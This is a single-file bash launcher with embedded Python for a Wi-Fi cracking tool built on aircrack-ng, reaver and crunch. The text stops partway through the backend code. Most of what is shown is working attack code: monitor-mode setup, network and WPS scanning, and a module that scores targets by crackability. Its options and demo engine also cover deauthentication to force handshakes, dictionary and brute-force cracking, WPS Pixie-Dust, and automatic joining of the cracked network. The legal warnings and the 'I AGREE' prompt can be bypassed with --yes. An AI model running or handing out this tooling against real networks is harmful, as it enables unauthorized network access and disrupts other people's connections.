#!/usr/bin/env bash
#
# single-script.sh — Educational Wi-Fi security auditing, in ONE self-contained file
# ---------------------------------------------------------------------------
# This is the entire crack-wifi project (launcher + Python backend + web UI +
# dependency setup) consolidated into a single script. On start it unpacks the
# embedded backend and web assets into a temporary directory, then walks you
# from a fresh Kali Linux install all the way to "you are on the network",
# driven from a simple local web interface at http://crack-wifi.local
#
# It is a friendly wrapper around the standard aircrack-ng suite (airmon-ng,
# airodump-ng, aireplay-ng, aircrack-ng) plus optional reaver/bully/hashcat.
#
# ############################################################################
# #  LEGAL / ETHICS                                                          #
# #  Only test networks that YOU OWN or that you have EXPLICIT WRITTEN       #
# #  permission to audit. Attacking networks you do not control is illegal   #
# #  in most countries. This tool exists for learning and authorized         #
# #  penetration testing only. You are responsible for how you use it.       #
# ############################################################################
#
set -euo pipefail

# ---------------------------------------------------------------------------
# Configuration & defaults
# ---------------------------------------------------------------------------
HOSTNAME_LOCAL="crack-wifi.local"
BIND_HOST="127.0.0.1"
PORT="8777"
MODE="auto"                 # auto | real | demo
MANAGE_DNS="1"              # add crack-wifi.local -> 127.0.0.1 to /etc/hosts
ASSUME_YES="0"
OPEN_BROWSER="1"
SKIP_SETUP="0"             # if 1, never auto-install missing dependencies
WORDLIST_DEFAULT="/usr/share/wordlists/rockyou.txt"
HOSTS_FILE="/etc/hosts"
HOSTS_MARKER="# added-by-crack.sh"
SERVER_PID=""
BUNDLE=""                  # temp dir the embedded assets are unpacked into

# Colours (fall back to nothing if not a tty)
if [[ -t 1 ]]; then
  C_RESET='\033[0m'; C_BOLD='\033[1m'; C_DIM='\033[2m'
  C_RED='\033[31m'; C_GRN='\033[32m'; C_YEL='\033[33m'; C_BLU='\033[34m'; C_CYA='\033[36m'
else
  C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GRN=''; C_YEL=''; C_BLU=''; C_CYA=''
fi

log()  { printf '%b\n' "${C_CYA}[*]${C_RESET} $*"; }
ok()   { printf '%b\n' "${C_GRN}[+]${C_RESET} $*"; }
warn() { printf '%b\n' "${C_YEL}[!]${C_RESET} $*"; }
err()  { printf '%b\n' "${C_RED}[x]${C_RESET} $*" >&2; }
step() { printf '\n%b\n' "${C_BOLD}${C_BLU}==> $*${C_RESET}"; }

usage() {
  cat <<EOF
${C_BOLD}single-script.sh${C_RESET} — educational Wi-Fi auditing launcher (single file)

Usage: sudo ./single-script.sh [options]

Options:
  --demo            Force demo mode (fake networks, no hardware needed, safe to
                    run anywhere — great for learning the workflow / the UI).
  --real            Force real mode (requires root + aircrack-ng + a Wi-Fi card
                    that supports monitor mode).
  --port <n>        Web UI port (default: ${PORT}).
  --host <ip>       Bind address for the web server (default: ${BIND_HOST}).
  --wordlist <f>    Default wordlist for dictionary attacks
                    (default: ${WORDLIST_DEFAULT}).
  --no-dns          Do NOT touch /etc/hosts; use http://${BIND_HOST}:PORT instead
                    of http://${HOSTNAME_LOCAL}:PORT.
  --no-browser      Do not try to auto-open a browser.
  --skip-setup      Do NOT auto-install missing dependencies.
  -y, --yes         Skip the interactive authorization prompt (you still accept
                    the terms — use only in automation / labs you own).
  -h, --help        Show this help.

The interface will be available at:
  http://${HOSTNAME_LOCAL}:${PORT}   (or http://${BIND_HOST}:${PORT} with --no-dns)
EOF
}

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    --demo) MODE="demo"; shift ;;
    --real) MODE="real"; shift ;;
    --port) PORT="${2:?}"; shift 2 ;;
    --host) BIND_HOST="${2:?}"; shift 2 ;;
    --wordlist) WORDLIST_DEFAULT="${2:?}"; shift 2 ;;
    --no-dns) MANAGE_DNS="0"; shift ;;
    --no-browser) OPEN_BROWSER="0"; shift ;;
    --skip-setup) SKIP_SETUP="1"; shift ;;
    -y|--yes) ASSUME_YES="1"; shift ;;
    -h|--help) usage; exit 0 ;;
    *) err "Unknown option: $1"; usage; exit 1 ;;
  esac
done

# ---------------------------------------------------------------------------
# Banner + authorization gate
# ---------------------------------------------------------------------------
banner() {
  printf '%b' "${C_BOLD}${C_CYA}"
  cat <<'EOF'
   ___                _     __        ___ _____ _
  / __\ __ __ _  ___ | | __ \ \      / (_)  ___(_)
 / / | '__/ _` |/ __|| |/ /  \ \ /\ / /| | |_  | |
/ /__| | | (_| | (__ |   <    \ V  V / | |  _| | |
\____/_|  \__,_|\___||_|\_\    \_/\_/  |_|_|   |_|
        educational wi-fi security auditing
EOF
  printf '%b\n' "${C_RESET}"
}

authorize() {
  printf '%b\n' "${C_YEL}${C_BOLD}"
  cat <<'EOF'
  ------------------------------------------------------------------
   AUTHORIZED USE ONLY
   Only audit Wi-Fi networks you own or have written permission to
   test. Unauthorized access to networks is a crime in most places.
   This tool is for learning and authorized penetration testing.
  ------------------------------------------------------------------
EOF
  printf '%b' "${C_RESET}"
  if [[ "$ASSUME_YES" == "1" ]]; then
    warn "Authorization auto-accepted via --yes."
    return 0
  fi
  read -r -p "Type 'I AGREE' to confirm you are authorized: " reply
  if [[ "$reply" != "I AGREE" ]]; then
    err "Authorization not given. Exiting."
    exit 1
  fi
  ok "Authorization confirmed."
}

# ---------------------------------------------------------------------------
# Environment detection
# ---------------------------------------------------------------------------
have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------------------
# Unpack the embedded backend + web assets into a temp directory.
# Everything that used to live in the wifi/ folder is stored inline below as
# quoted heredocs and materialised here at runtime, so this one file is fully
# self-contained.
# ---------------------------------------------------------------------------
extract_bundle() {
  BUNDLE="$(mktemp -d "${TMPDIR:-/tmp}/crack-wifi.XXXXXX")"
  mkdir -p "${BUNDLE}/server" "${BUNDLE}/lib" "${BUNDLE}/web"

  cat > "${BUNDLE}/setup.sh" <<'CRACK_EOF_SETUP'
#!/usr/bin/env bash
#
# setup.sh — install everything crack.sh needs, using on-board means (apt).
#
# On Kali / Debian / Ubuntu this installs any missing dependency automatically.
# It is idempotent: run it as often as you like, it only installs what's absent.
# crack.sh calls this for you when it notices something is missing, so you
# normally never run it by hand.
#
set -euo pipefail

# Colours (fall back to nothing if not a tty)
if [[ -t 1 ]]; then
  C_RESET='\033[0m'; C_BOLD='\033[1m'
  C_GRN='\033[32m'; C_YEL='\033[33m'; C_RED='\033[31m'; C_CYA='\033[36m'
else
  C_RESET=''; C_BOLD=''; C_GRN=''; C_YEL=''; C_RED=''; C_CYA=''
fi
log()  { printf '%b\n' "${C_CYA}[*]${C_RESET} $*"; }
ok()   { printf '%b\n' "${C_GRN}[+]${C_RESET} $*"; }
warn() { printf '%b\n' "${C_YEL}[!]${C_RESET} $*"; }
err()  { printf '%b\n' "${C_RED}[x]${C_RESET} $*" >&2; }

have() { command -v "$1" >/dev/null 2>&1; }

# Map required command -> apt package that provides it.
# aircrack-ng ships airmon-ng / airodump-ng / aireplay-ng / aircrack-ng.
declare -A PKG=(
  [airodump-ng]="aircrack-ng"
  [aircrack-ng]="aircrack-ng"
  [aireplay-ng]="aircrack-ng"
  [airmon-ng]="aircrack-ng"
  [iw]="iw"
  [reaver]="reaver"          # WPS Pixie-Dust (optional but recommended)
  [wash]="reaver"            # WPS scanner (ships with the reaver package)
  [crunch]="crunch"          # bruteforce keyspace generator (optional)
  [python3]="python3"        # runs the web server
  [xdg-open]="xdg-utils"     # so we can auto-open your browser
  [nmcli]="network-manager"  # so we can actually join the network for you
)

# Order matters only for readability of the summary.
REQUIRED=(python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng xdg-open)
OPTIONAL=(reaver wash crunch nmcli)

need_sudo() {
  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    if have sudo; then echo "sudo"; else echo ""; fi
  else
    echo ""
  fi
}

collect_missing() {
  local -n _out=$1; shift
  _out=()
  local pkgs_seen=""
  for cmd in "$@"; do
    if ! have "$cmd"; then
      local p="${PKG[$cmd]:-$cmd}"
      case " $pkgs_seen " in
        *" $p "*) : ;;                     # already queued this package
        *) _out+=("$p"); pkgs_seen="$pkgs_seen $p" ;;
      esac
    fi
  done
}

main() {
  printf '%b\n' "${C_BOLD}${C_CYA}== crack-wifi setup ==${C_RESET}"

  local missing_req=() missing_opt=()
  collect_missing missing_req "${REQUIRED[@]}"
  collect_missing missing_opt "${OPTIONAL[@]}"

  if [[ ${#missing_req[@]} -eq 0 && ${#missing_opt[@]} -eq 0 ]]; then
    ok "All dependencies are already installed. Nothing to do."
    return 0
  fi

  [[ ${#missing_req[@]} -gt 0 ]] && warn "Missing (required): ${missing_req[*]}"
  [[ ${#missing_opt[@]} -gt 0 ]] && log  "Missing (optional): ${missing_opt[*]}"

  # We install on-board via apt. If apt isn't here, give manual guidance.
  if ! have apt-get; then
    err "No apt-get found — this doesn't look like Kali/Debian/Ubuntu."
    err "Install these packages with your distro's package manager:"
    err "  required: ${missing_req[*]}"
    [[ ${#missing_opt[@]} -gt 0 ]] && err "  optional: ${missing_opt[*]}"
    # Missing required deps are fatal; missing optional ones are fine.
    [[ ${#missing_req[@]} -gt 0 ]] && return 1
    return 0
  fi

  local SUDO; SUDO="$(need_sudo)"
  if [[ "${EUID:-$(id -u)}" -ne 0 && -z "$SUDO" ]]; then
    err "Need root to install packages, and 'sudo' is not available."
    err "Re-run as root:  su -c '$0'"
    return 1
  fi

  local to_install=("${missing_req[@]}" "${missing_opt[@]}")
  log "Installing: ${to_install[*]}"
  log "(using apt — this is the on-board package manager on Kali)"

  # apt update can be flaky on fresh installs; don't abort the whole run on it.
  $SUDO apt-get update -y || warn "apt-get update reported problems — continuing."

  if $SUDO apt-get install -y "${to_install[@]}"; then
    ok "Dependencies installed."
  else
    # Retry required-only in case an optional package name was unavailable.
    if [[ ${#missing_req[@]} -gt 0 ]]; then
      warn "Bulk install failed — retrying required packages only."
      $SUDO apt-get install -y "${missing_req[@]}"
    fi
  fi

  # Final verification of the required set.
  local still=()
  collect_missing still "${REQUIRED[@]}"
  if [[ ${#still[@]} -gt 0 ]]; then
    err "Still missing after install: ${still[*]}"
    return 1
  fi
  ok "Setup complete — you're ready to run ./crack.sh"
}

main "$@"
CRACK_EOF_SETUP

  cat > "${BUNDLE}/lib/difficulty.py" <<'CRACK_EOF_DIFFICULTY'
"""
difficulty.py — estimate how hard a given Wi-Fi network is to crack.

This produces a rough, educational estimate only. It combines the encryption
type, whether WPS is enabled, signal strength (affects handshake capture) and
the number of connected clients (affects how easy it is to force a handshake).

Returned dict:
    {
      "score":      0-100   (higher = harder),
      "label":      "Trivial" | "Easy" | "Moderate" | "Hard" | "Very hard",
      "eta":        human string, e.g. "seconds", "minutes-hours",
      "method":     recommended attack method key,
      "reasons":    [ "human readable factor", ... ]
    }
"""

# Base hardness per encryption family (0 easy .. 100 hard)
_ENC_BASE = {
    "OPEN":  0,
    "WEP":   8,
    "WPA":   55,
    "WPA2":  60,
    "WPA2/WPA3": 78,
    "WPA3":  92,
}

_LABELS = [
    (10,  "Trivial"),
    (30,  "Easy"),
    (55,  "Moderate"),
    (80,  "Hard"),
    (101, "Very hard"),
]


def _label_for(score):
    for threshold, label in _LABELS:
        if score < threshold:
            return label
    return "Very hard"


def _norm_enc(enc):
    e = (enc or "").upper().replace(" ", "")
    if "WPA3" in e and "WPA2" in e:
        return "WPA2/WPA3"
    for k in ("WPA3", "WPA2", "WPA", "WEP", "OPEN", "OPN"):
        if k in e:
            return "OPEN" if k == "OPN" else k
    return "WPA2"


def estimate(network):
    """`network` is a dict with keys: enc, wps, signal (dBm), clients, ssid."""
    enc = _norm_enc(network.get("enc"))
    wps = bool(network.get("wps"))
    signal = network.get("signal")          # dBm, e.g. -45 (strong) .. -85 (weak)
    clients = int(network.get("clients") or 0)

    score = _ENC_BASE.get(enc, 60)
    reasons = []
    method = "handshake+dictionary"

    if enc == "OPEN":
        return {
            "score": 0, "label": "Trivial", "eta": "instant",
            "method": "open-join",
            "reasons": ["Network is open — no key required."],
        }

    if enc == "WEP":
        reasons.append("WEP is broken; enough IVs recover the key in minutes.")
        method = "wep-iv"
        score = 8

    # WPS pixie-dust / PIN brute makes strong WPA2 much weaker.
    if wps and enc in ("WPA", "WPA2", "WPA2/WPA3"):
        score = min(score, 35)
        method = "wps-pixie"
        reasons.append("WPS enabled — Pixie-Dust / PIN attack often bypasses the passphrase.")

    if enc == "WPA3":
        reasons.append("WPA3-SAE resists offline cracking; no easy path.")
    elif enc == "WPA2/WPA3":
        reasons.append("Mixed WPA2/WPA3 — WPA2 clients may still expose a handshake.")

    # Signal quality affects how reliably we can capture a handshake.
    if signal is not None:
        try:
            s = int(signal)
            if s >= -55:
                reasons.append("Strong signal — handshake capture is reliable.")
                score -= 3
            elif s <= -80:
                reasons.append("Weak signal — capturing a handshake may take many tries.")
                score += 8
        except (TypeError, ValueError):
            pass

    # Clients present make forcing a handshake (deauth) much easier.
    if clients > 0:
        reasons.append(f"{clients} client(s) connected — easy to force a handshake via deauth.")
        score -= 4
    elif enc != "WEP":
        reasons.append("No clients connected — must wait for one to join to capture a handshake.")
        score += 6

    score = max(0, min(100, int(round(score))))

    # ETA bucket derived from the final score.
    if score < 10:
        eta = "seconds"
    elif score < 30:
        eta = "minutes"
    elif score < 55:
        eta = "minutes to hours"
    elif score < 80:
        eta = "hours to days (depends on wordlist)"
    else:
        eta = "impractical offline"

    return {
        "score": score,
        "label": _label_for(score),
        "eta": eta,
        "method": method,
        "reasons": reasons,
    }
CRACK_EOF_DIFFICULTY

  cat > "${BUNDLE}/lib/engine.py" <<'CRACK_EOF_ENGINE'
"""
engine.py — the Wi-Fi auditing engine.

Two backends:
  * DemoEngine — generates believable fake networks and simulates every phase of
    a real audit with timed log output. Runs anywhere, no hardware, no root.
  * RealEngine — drives the aircrack-ng suite (airmon-ng / airodump-ng /
    aireplay-ng / aircrack-ng, plus reaver for WPS). Requires root and a card
    that supports monitor mode.

Both expose the same interface used by server.py:
    scan()                         -> list[network dict]
    start_attack(bssid, options)   -> job_id
    get_job(job_id)                -> job dict (status, log events, result)
    stop_job(job_id)

A "job" is a running attack. Its log is a list of {t, phase, level, msg}
events that the web UI polls and streams into the console view.
"""

import os
import re
import time
import uuid
import shutil
import threading
import subprocess

try:
    from .difficulty import estimate
except ImportError:                     # allow running as a flat script
    from difficulty import estimate


# ---------------------------------------------------------------------------
# Shared job bookkeeping
# ---------------------------------------------------------------------------
class Job:
    def __init__(self, network, options):
        self.id = uuid.uuid4().hex[:12]
        self.network = network
        self.options = options
        self.status = "running"          # running | success | failed | stopped
        self.result = None               # {"key":..., "user":..., "method":...}
        self.log = []                    # list of event dicts
        self.progress = None             # {"phase":..., "pct":0-100} for the UI bar
        self.created = time.time()
        self._stop = threading.Event()
        self._lock = threading.Lock()

    def emit(self, phase, msg, level="info", pct=None):
        with self._lock:
            if pct is not None:
                self.progress = {"phase": phase, "pct": max(0, min(100, int(pct)))}
            self.log.append({
                "t": round(time.time() - self.created, 2),
                "phase": phase,
                "level": level,
                "msg": msg,
                "pct": (self.progress["pct"] if pct is not None else None),
            })

    def snapshot(self, since=0):
        with self._lock:
            events = self.log[since:]
        return {
            "id": self.id,
            "status": self.status,
            "result": self.result,
            "network": self.network,
            "events": events,
            "total_events": len(self.log),
            "progress": self.progress,
        }

    def stopped(self):
        return self._stop.is_set()

    def request_stop(self):
        self._stop.set()


class BaseEngine:
    def __init__(self, wordlist=None):
        self.wordlist = wordlist
        self.jobs = {}
        self._networks = []
        self.handshakes = set()   # bssids whose handshake was captured this session

    def start_attack(self, bssid, options):
        net = next((n for n in self._networks if n["bssid"] == bssid), None)
        if net is None:
            net = {"bssid": bssid, "ssid": options.get("ssid", "(unknown)"),
                   "enc": options.get("enc", "WPA2"), "channel": options.get("channel", 1),
                   "signal": -60, "clients": 1, "wps": bool(options.get("wps"))}
        # Guarantee a difficulty estimate is always present.
        if "difficulty" not in net:
            net = dict(net)
            net["difficulty"] = estimate(net)
        job = Job(net, options)
        self.jobs[job.id] = job
        t = threading.Thread(target=self._run_attack_safe, args=(job,), daemon=True)
        t.start()
        return job.id

    def _run_attack_safe(self, job):
        """Wrapper so an unexpected error never leaves a job stuck 'running'."""
        try:
            self._run_attack(job)
        except Exception as e:  # pragma: no cover - defensive
            job.emit("error", f"Attack aborted: {e}", "error")
            job.status = "failed"

    def get_job(self, job_id, since=0):
        job = self.jobs.get(job_id)
        return job.snapshot(since) if job else None

    def stop_job(self, job_id):
        job = self.jobs.get(job_id)
        if job and job.status == "running":
            job.request_stop()
            return True
        return False

    # subclasses implement scan() and _run_attack()


# ---------------------------------------------------------------------------
# DEMO engine
# ---------------------------------------------------------------------------
_DEMO_NETWORKS = [
    # ssid, bssid, enc, channel, signal, clients, wps, secret, user
    ("Loft_5G",        "A4:2B:8C:11:02:F0", "WPA2",      36, -48, 3, False, "sunshine2021", None),
    ("FRITZ!Box 7590", "3C:A6:2F:9D:44:1A", "WPA2",      6,  -61, 2, True,  "01998877665544", None),
    ("xfinitywifi",    "12:34:56:78:9A:BC", "OPEN",      11, -70, 8, False, None, None),
    ("Netgear-Guest",  "9C:3D:CF:00:AB:12", "WPA2",      1,  -55, 1, False, "password123", None),
    ("HomeOffice",     "E0:CB:4E:77:88:99", "WPA2/WPA3", 44, -52, 4, False, None, None),
    ("legacy_wifi",    "00:1D:0F:AA:BB:CC", "WEP",        3, -66, 0, False, "1A2B3C4D5E", None),
    ("StarbucksSecure","B8:27:EB:12:34:56", "WPA2",      9,  -74, 0, True,  "coffee4life", None),
    ("Vodafone-A1B2",  "44:E1:37:0F:2E:9D", "WPA2",      40, -58, 2, False, "8charsminimum", None),
    ("NeighborNet",    "F4:F5:E8:01:23:45", "WPA3",      6,  -63, 1, False, None, None),
    ("guest_portal",   "0A:0B:0C:0D:0E:0F", "OPEN",       1, -59, 5, False, None, "guest / welcome"),
]


class DemoEngine(BaseEngine):
    mode = "demo"

    def scan(self, duration=3):
        nets = []
        for (ssid, bssid, enc, ch, sig, clients, wps, secret, user) in _DEMO_NETWORKS:
            n = {
                "ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
                "signal": sig, "clients": clients, "wps": wps,
                "has_handshake": bssid in self.handshakes,
                "_secret": secret, "_user": user,
            }
            n["difficulty"] = estimate(n)
            nets.append(n)
        self._networks = nets
        # Return a copy without the private fields.
        return [{k: v for k, v in n.items() if not k.startswith("_")} for n in nets]

    def _sleep(self, job, seconds):
        """Interruptible sleep so 'stop' feels responsive."""
        end = time.time() + seconds
        while time.time() < end:
            if job.stopped():
                return False
            time.sleep(0.1)
        return True

    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        ssid = net.get("ssid")
        bssid = net.get("bssid")
        ch = net.get("channel")

        job.emit("init", f"Target selected: {ssid} ({bssid}) on channel {ch}, {enc}.")
        job.emit("init", f"Estimated difficulty: {net['difficulty']['label']} "
                         f"(score {net['difficulty']['score']}/100, ETA {net['difficulty']['eta']}).")

        # --- Open network -----------------------------------------------------
        if enc.startswith("OPEN") or enc == "OPN":
            if not self._sleep(job, 1): return self._finish(job, "stopped")
            job.emit("join", "Open network — no key required. Associating...", "info")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            user = net.get("_user")
            connected, cmd = self._connect_sim(job, net, None)
            job.result = {"key": None, "user": user, "method": "open-join",
                          "connected": connected, "connect_cmd": cmd,
                          "note": "Open network — no passphrase."
                                  + (f" Captive-portal creds: {user}" if user else "")}
            return self._finish(job, "success")

        # --- Monitor mode -----------------------------------------------------
        job.emit("monitor", "Enabling monitor mode on wlan0 -> wlan0mon (airmon-ng start wlan0).")
        if not self._sleep(job, 1.2): return self._finish(job, "stopped")
        job.emit("monitor", "Monitor interface wlan0mon is up.", "success")

        # --- WEP path ---------------------------------------------------------
        if enc == "WEP":
            job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).", pct=0)
            for pct in (12, 34, 58, 81, 100):
                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                job.emit("capture", f"Collected IVs... {pct}%", pct=pct)
            job.emit("crack", "Running aircrack-ng PTW attack on captured IVs.")
            if not self._sleep(job, 1.2): return self._finish(job, "stopped")
            return self._succeed(job, net, method="wep-iv")

        # --- WPS pixie-dust (if enabled and requested/auto) -------------------
        want_wps = net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie")
        if want_wps:
            job.emit("wps", "WPS is enabled — trying Pixie-Dust (reaver -K 1).")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            # Demo: pixie works on some, not all.
            if net["difficulty"]["method"] == "wps-pixie":
                job.emit("wps", "Pixie-Dust recovered the WPS PIN.", "success")
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                return self._succeed(job, net, method="wps-pixie")
            job.emit("wps", "Pixie-Dust failed — falling back to handshake capture.", "warn")

        # --- WPA/WPA2 handshake capture --------------------------------------
        if enc.startswith("WPA3"):
            job.emit("capture", "Target is WPA3-SAE. Attempting to capture SAE exchange...")
            if not self._sleep(job, 2): return self._finish(job, "stopped")
            job.emit("crack", "WPA3-SAE has no offline-crackable 4-way handshake.", "warn")
            job.emit("done", "No practical offline attack against WPA3-SAE.", "error")
            return self._finish(job, "failed")

        if bssid in self.handshakes:
            job.emit("capture", "Reusing the 4-way handshake captured earlier this "
                                "session — no need to capture it again.", "success")
        else:
            job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
            if not self._sleep(job, 1): return self._finish(job, "stopped")
            if net.get("clients", 0) > 0:
                job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth "
                                   f"(aireplay-ng --deauth 5) to force a reconnect.")
            else:
                job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
                if not self._sleep(job, 1.5): return self._finish(job, "stopped")
                job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            job.emit("capture", "WPA handshake captured!  (EAPOL 4/4)", "success")
            self.handshakes.add(bssid)

        # --- Crack the handshake ---------------------------------------------
        method = opts.get("method") or "handshake+dictionary"
        if method == "handshake+bruteforce" or opts.get("bruteforce"):
            charset = opts.get("charset", "digits")
            length = opts.get("length", 8)
            job.emit("crack", f"Bruteforce mode: {charset}, length {length} "
                              f"(aircrack-ng via crunch pipe). This can take a very long time.", pct=0)
            for pct in (3, 9, 21, 40, 66, 92, 100):
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                job.emit("crack", f"Keyspace searched... {pct}%", pct=pct)
            return self._succeed(job, net, method="handshake+bruteforce")
        else:
            wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
            wl = self._resolve_wordlist(job, wl)
            if wl is None:
                return self._finish(job, "stopped" if job.stopped() else "failed")
            job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
            for i, pct in enumerate((5, 18, 37, 59, 78, 95, 100)):
                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                tested = pct * 1423
                job.emit("crack", f"Tested {tested:,} keys... {pct}%", pct=pct)
            return self._succeed(job, net, method="handshake+dictionary")

    def _connect_sim(self, job, net, key):
        """Simulate leaving monitor mode and joining via nmcli."""
        ssid = net.get("ssid")
        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                 else f"nmcli dev wifi connect '{ssid}'")
        if not job.options.get("connect", True):
            job.emit("connect", f"Auto-connect off. Connect with: {shown}")
            return False, shown
        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
        self._sleep(job, 1.0)
        job.emit("connect", f"Connecting: {shown}")
        self._sleep(job, 1.0)
        job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
        return True, shown

    def _resolve_wordlist(self, job, wl):
        """In demo mode 'downloading' a wordlist from the internet is simulated
        with a progress bar so the workflow matches real mode exactly."""
        if isinstance(wl, str) and wl.lower().startswith(("http://", "https://")):
            name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
            job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
            for pct in (8, 26, 50, 74, 92, 100):
                if not self._sleep(job, 0.5):
                    return None
                job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
            job.emit("download", f"Saved {name} — using it for the dictionary attack.", "success", pct=100)
            return name
        return wl

    def _succeed(self, job, net, method):
        secret = net.get("_secret") or "(demo-key-not-set)"
        user = net.get("_user")
        job.emit("done", f"KEY FOUND: {secret}", "success")
        connected, cmd = self._connect_sim(job, net, secret)
        job.result = {"key": secret, "user": user, "method": method,
                      "connected": connected, "connect_cmd": cmd,
                      "note": "Recovered in demo mode."}
        return self._finish(job, "success")

    def _finish(self, job, status):
        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


# ---------------------------------------------------------------------------
# REAL engine (aircrack-ng suite)
# ---------------------------------------------------------------------------
class RealEngine(BaseEngine):
    mode = "real"

    def __init__(self, wordlist=None, workdir="/tmp/crack-wifi"):
        super().__init__(wordlist)
        self.workdir = workdir
        os.makedirs(self.workdir, exist_ok=True)
        self.mon_iface = None

    # -- helpers ----------------------------------------------------------
    def _run(self, cmd, timeout=None):
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

    def _wireless_ifaces(self):
        try:
            out = self._run(["iw", "dev"]).stdout
        except Exception:
            return []
        return re.findall(r"Interface\s+(\S+)", out)

    def _ensure_monitor(self, job):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if mon:
            self.mon_iface = mon
            return mon
        base = ifaces[0] if ifaces else "wlan0"
        job.emit("monitor", f"Starting monitor mode on {base} (airmon-ng start {base}).")
        self._run(["airmon-ng", "check", "kill"])
        self._run(["airmon-ng", "start", base])
        mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon
        job.emit("monitor", f"Monitor interface {mon} is up.", "success")
        return mon

    # -- scanning ---------------------------------------------------------
    def scan(self, duration=8):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if not mon:
            base = ifaces[0] if ifaces else "wlan0"
            self._run(["airmon-ng", "check", "kill"])
            self._run(["airmon-ng", "start", base])
            mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon

        prefix = os.path.join(self.workdir, "scan")
        for ext in ("csv", "cap", "kismet.csv", "kismet.netxml"):
            for f in _glob(prefix, ext):
                try: os.remove(f)
                except OSError: pass

        proc = subprocess.Popen(
            ["airodump-ng", "--write-interval", "1", "--output-format", "csv",
             "-w", prefix, mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()

        csvs = _glob(prefix, "csv")
        nets = _parse_airodump_csv(csvs[0]) if csvs else []

        # Enrich with WPS status (airodump CSV doesn't expose it) using wash.
        wps = self._wps_bssids(mon, duration=min(6, duration))
        for n in nets:
            if n["bssid"].upper() in wps:
                n["wps"] = True
            n["has_handshake"] = n["bssid"] in self.handshakes
            n["difficulty"] = estimate(n)

        self._networks = nets
        return nets

    def _wps_bssids(self, mon, duration=6):
        """Return the set of WPS-enabled BSSIDs (uppercase) seen by wash."""
        if not shutil.which("wash"):
            return set()
        try:
            proc = subprocess.Popen(["wash", "-i", mon],
                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                    text=True)
            time.sleep(duration)
            proc.terminate()
            try:
                out, _ = proc.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()
        except Exception:
            return set()
        found = set()
        for line in (out or "").splitlines():
            m = re.match(r"\s*([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", line)
            if m:
                found.add(m.group(1).upper())
        return found

    # -- connecting (leave monitor mode, join the network for real) -------
    def _restore_managed(self, job=None):
        """Stop monitor interfaces and bring NetworkManager back up.
        airmon-ng check kill stops NetworkManager, so we must restart it
        before we can associate with a network."""
        for i in self._wireless_ifaces():
            if i.endswith("mon"):
                self._run(["airmon-ng", "stop", i])
        self.mon_iface = None
        for cmd in (["systemctl", "restart", "NetworkManager"],
                    ["service", "NetworkManager", "restart"],
                    ["service", "network-manager", "restart"]):
            if shutil.which(cmd[0]):
                self._run(cmd)
                break
        time.sleep(3)

    def _connect(self, job, ssid, key=None):
        """Actually join the network via nmcli. Returns (connected, shown_cmd)."""
        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                 else f"nmcli dev wifi connect '{ssid}'")
        if not shutil.which("nmcli"):
            job.emit("connect", "nmcli not found — connect via your Wi-Fi menu.", "warn")
            return False, shown
        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
        self._restore_managed(job)
        self._run(["nmcli", "dev", "wifi", "rescan"], timeout=20)
        time.sleep(2)
        cmd = (["nmcli", "dev", "wifi", "connect", ssid, "password", key] if key
               else ["nmcli", "dev", "wifi", "connect", ssid])
        job.emit("connect", f"Connecting: {shown}")
        try:
            r = self._run(cmd, timeout=45)
        except Exception as e:
            job.emit("connect", f"Connect error: {e}. Run manually: {shown}", "warn")
            return False, shown
        out = ((r.stdout or "") + (r.stderr or "")).lower()
        ok = "successfully activated" in out or (r.returncode == 0 and "error" not in out)
        if ok:
            job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
        else:
            job.emit("connect", f"Auto-connect failed. Run manually: {shown}", "warn")
        return ok, shown

    def _resolve_wordlist(self, job, wl):
        """If wl is an http(s) URL, download it into the workdir (with a progress
        bar) and return the local path. Local paths pass through unchanged.
        Downloads are cached by filename so re-runs this session never re-fetch."""
        if not (isinstance(wl, str) and wl.lower().startswith(("http://", "https://"))):
            return wl
        import urllib.request
